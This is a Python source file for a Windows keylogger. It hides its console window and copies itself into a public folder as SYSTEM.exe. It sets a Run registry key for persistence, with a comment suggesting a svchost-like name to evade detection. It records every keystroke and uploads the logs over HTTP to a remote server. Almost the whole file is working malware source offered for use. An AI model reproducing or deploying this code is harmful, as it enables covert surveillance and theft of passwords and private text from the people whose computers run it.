import pyHook
import pythoncom
import os, sys, time, uuid
import shutil
import win32event, win32api, winerror,winreg
import requests
import datetime

#global url,x,data
url='http://192.168.0.11:8000/keylogs/' #adress of HttpServer with upload (https://gist.github.com/UniIsland/3346170)
x=1
data=""

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def replicate(path):
    from pathlib import Path
    my_file = Path(r"C:\Users\Public\Music\SYSTEM.exe")
    if not(my_file.exists()):
        path=path.replace(".py",".exe")     #needed if you want to make exe with pyinstaller
        #print("Replicating...")
        shutil.copy2(path,r"C:\Users\Public\Music\SYSTEM.exe")
    #else:
        #print("Already copied")

def addStartup():
    
    new_file_path=r"C:\Users\Public\Music\SSSHOST.exe"      #change for svchost if you want to make it harder to find
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= winreg.OpenKey(winreg.HKEY_CURRENT_USER,keyVal,0,winreg.KEY_ALL_ACCESS)

    winreg.SetValueEx(key2change, "SYSTEM",0,winreg.REG_SZ, new_file_path)
    #print("Added to StartupRegistry")
    
    return True

def sendViaSimpleHttpServer(char):
    global data,x,now
    data+=char
    if(len(data)>20):
        #print("Setka, wysylam")
        data+='\n'
        now = datetime.datetime.now()
        timeInfo = now.strftime("log_%m-%d_%H-%M-%S.txt")
        nazwapliku='log'+timeInfo+'.txt'
        #print(data)
        files = {'file': (timeInfo, '\n'+data)}
        r = requests.post(url, files=files)
        #print(r.text)
        data=""
        x+=1
        
def keypressed(event):
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)           #add more in future
    sendViaSimpleHttpServer(keys)
    #print (keys, end="")
    #fp=open("keylogs.txt","a")
    #fp.write(keys)
    #fp.close()

    return True

def main():
    #print("main")
    hide()
    replicate(__file__)
    #print("replicate done")
    addStartup()
    #print("startUp done")
    
    obj = pyHook.HookManager()
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()
    
    

main()
